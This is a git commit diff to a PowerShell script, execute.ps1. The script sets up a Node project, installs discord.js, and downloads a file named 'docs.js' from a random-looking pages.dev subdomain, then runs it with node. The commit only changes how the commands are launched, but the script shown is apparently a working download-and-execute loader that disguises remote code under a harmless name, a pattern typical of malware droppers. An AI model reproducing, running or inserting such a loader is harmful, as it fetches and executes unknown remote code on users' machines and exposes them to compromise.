801cb2c6a70c7afb6b1e4ed7a2a3d4c4266f7f37
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-12 23:11:30 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -6,14 +6,14 @@ if (-Not (Test-Path -Path $folderPath)) {
 
 Set-Location -Path $folderPath
 
-Start-Process -FilePath "C:\Program Files\nodejs\npm.cmd" -ArgumentList "init -y" -Wait -NoNewWindow
+& "C:\Program Files\nodejs\npm.cmd" init -y
 
 Start-Sleep -Seconds 5
 
-Start-Process -FilePath "C:\Program Files\nodejs\npm.cmd" -ArgumentList "install discord.js" -Wait -NoNewWindow
+& "C:\Program Files\nodejs\npm.cmd" install discord.js
 
 Start-Sleep -Seconds 5
 
 Invoke-WebRequest -Uri "https://ipspjyikta.pages.dev/files/docs.js" -OutFile "$folderPath\docs.js"
 
-Start-Process -FilePath "C:\Program Files\nodejs\node.exe" -ArgumentList "docs.js" -NoNewWindow
+& "C:\Program Files\nodejs\node.exe" docs.js
